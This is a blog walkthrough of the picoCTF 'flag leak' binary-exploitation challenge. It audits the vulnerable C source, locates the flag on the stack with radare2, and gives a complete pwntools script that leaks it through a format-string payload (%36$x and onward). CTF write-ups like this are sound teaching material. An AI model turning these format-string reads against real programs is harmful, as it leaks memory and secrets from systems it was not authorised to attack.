---
title: Exploiting "flag leak" on picoCTF
author: tech0ne
date: 2025-08-13 15:00:00 +0100
categories: [walkthrough, picoctf, binary-exploitation]
comments: true
toc: true
pin: false
tags: [walkthrough, picoctf, linux, programming, c, binary-exploitation]
math: true
mermaid: true
---

# Introduction

You know the drill, just finished exploiting [flag leak](https://play.picoctf.org/practice/challenge/269), so i'll share how I did it with you.

## Disclamer

> As always, this is a COMPLETE WALKTHROUGH giving a FULL AND WORKING solution. It's HIGHLY advised to do the CTF before looking at this !
{: .prompt-danger }

With that said, let's go over what we'll do in today's post.

# The CTF

Entering the world of `medium` chalenges.

This challenge was introduced in the `picoctf 2022`.

We still have both the source code, and the executable. 

## Initial lookup

Here is the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```
{: file="vuln.c" }

Hmmmm, intresting.

By the name of the challenge, we can see that the main focus will be PIE bypass.

Before diveing into what is PIE and how we can bypass it, let's take a look at the compiled executable.

We'll check it's security using `checksec`:

![checksec on vuln](/assets/img/posts/walkthrough/picoctf/flag_leak/checksec.png "checksec on vuln")

Well, no security, except NX (Non eXecutable stack).

Good, we won't exploit that.

## Source code auditing

Okay, one thing I see, first, is line 32:

```c
printf(story);
```

with story being set as:

```c
char story[128];
// [REDACTED]
scanf("%127s", story);
```

Okay so, what that means is: We have a `story` story string variable containing our input, printed using printf as first argument.

That awefully smells like format-string exploits !

## First run

Allright, let's try to confirm the presence of a format-string vulnerability:

![oops, missing flag.txt](/assets/img/posts/walkthrough/picoctf/flag_leak/missing_flag.png "oops, missing flag.txt")

Oops, let's fix that and retry:

![confirming the vulnerability](/assets/img/posts/walkthrough/picoctf/flag_leak/simple_flag.png "confirming the vulnerability")

Ok, that seems to be vulnerable !

Ok, so, now, we need a way to read our flag.

We will now start using radare2 for our exploitation journey (the exploit will still be writen in python using pwntools).

> There are other great tools available, like [rizin](https://rizin.re/) (a fork of radare2) or [gdb](https://fr.wikipedia.org/wiki/GNU_Debugger) (you can use [GEF](https://github.com/hugsy/gef) to greatly ease it's use). Use whatever you're most confident with.

![radare2 interface](/assets/img/posts/walkthrough/picoctf/flag_leak/radare2_interface.png "radare2 interface")

From here, we will do the following:

- disassemble the `sym.vuln` function, and set a breakpoint just after the `printf(story);`.
- after retreiving that output, we'll compare it with the actual stack content, trying to find where we are.

![vuln disassembled](/assets/img/posts/walkthrough/picoctf/flag_leak/vuln_disassembled.png "vuln disassembled")

> Okay, but how can you know this is the `printf(story);` printf, and not any other ?
{: .prompt-info }

That's actually a really good question.

Indeed, we have multiple hints of that:

First of all, most of the static `printf`s have been "redacted" to using smaller functions, like `puts` or `putchar` (you'd be suprised to know how heavy `printf` really is (; ).

![interpreted output](/assets/img/posts/walkthrough/picoctf/flag_leak/interpreted_output.png "interpreted output")

One thing you can see, is that before every other `printf` (except the last one, caus it's a single character) and `scanf`, there is a `lea eax, [ebx - random_hex_value]`, representing the assmebly retreiving a hardcoded string variable.

This is not the case on our `printf(story);`, because the asm code just retreive the stack variable `story`.

Long story short, it's our target :}

Next, we'll try to locate our flag on the stack:

![stack displayed on radare2](/assets/img/posts/walkthrough/picoctf/flag_leak/displayed_stack.png "stack displayed on radare2")

Okay, our flag is show on the stack. That's a good start !

As we can see from the stack, it's around 30-40 "chunks" after our current stack pointer (A "chunk" is 4 bytes, as we are on a 32bits binary).

All right, so we can use the `%[number]$x` syntax to retreive just the bytes we want !

Let's start with 30:

![show our flag](/assets/img/posts/walkthrough/picoctf/flag_leak/30_to_40_display.png "show our flag")

Okay, is there anything intresting ?

> Well, doesn't look like it... Wait, what is that `47414c46` ?
{: .prompt-info }

Well, let's check it out:

![it is our flag !](/assets/img/posts/walkthrough/picoctf/flag_leak/it_is_our_flag.png "it is our flag !")

Well, it is our flag, but in reverse.

> Why is it reversed ? Is it normal ? It was not reversed on radare2 !
{: .prompt-info }

Yeah, that's normal. That's a little anoying in the beggining, but you get used to it ;)

Okay, well the offset is a little more than 30.

It's exactly 36.

Okay, nice !

Knowing that, and knowing that our flag is 64 bytes long at most, we can make a little script automating that for us

# Automating

This is the script I came with to automate the exploitation of this CTF:

```py
from pwn import *

offset = 36

host = args.HOST or input("host: ")
port = args.PORT or input("port: ")

p = remote(host=host, port=int(port))

p.recv()

string = f'%{offset}$x'

for i in range(1, 16):
    string += f'.%{offset + i}$x'

string = string.encode()

p.sendline(string)

p.recvline()
output = p.recvline().decode()[:-1]

output = output.split('.')
string = ''

for e in output:
    try:
        string += bytes.fromhex(e)[::-1].decode()
    except:
        pass

print(string)
```
{: file="exploit.py" }

All right, let's explain the little weird parts

```py
string = f'%{offset}$x'

for i in range(1, 16):
    string += f'.%{offset + i}$x'
```

This is used to generate the `%36$x.%37$x.%38$x.%39$x.%40$x...` payload string.

It will generate 16 formaters, each of which are 4 bytes long, making a 64 bytes long payload.

```py
output = p.recvline().decode()[:-1]

output = output.split('.')
string = ''

for e in output:
    try:
        string += bytes.fromhex(e)[::-1].decode()
    except:
        pass
```

This is the most important part:

It will first retreive the output of our payload, decode it and remove the trailing '\n' character.

Next, we split each chunk, divided by dots.

Finaly, we decode each chunk as hexadecimals.

The try except is just here to avoid issues I had when making the exploit.

# Conclusion

On that CTF, we were able to read an arbitraty variable through a printf vulnerability.

That was cool !

Well, happy hacking boys <3 !
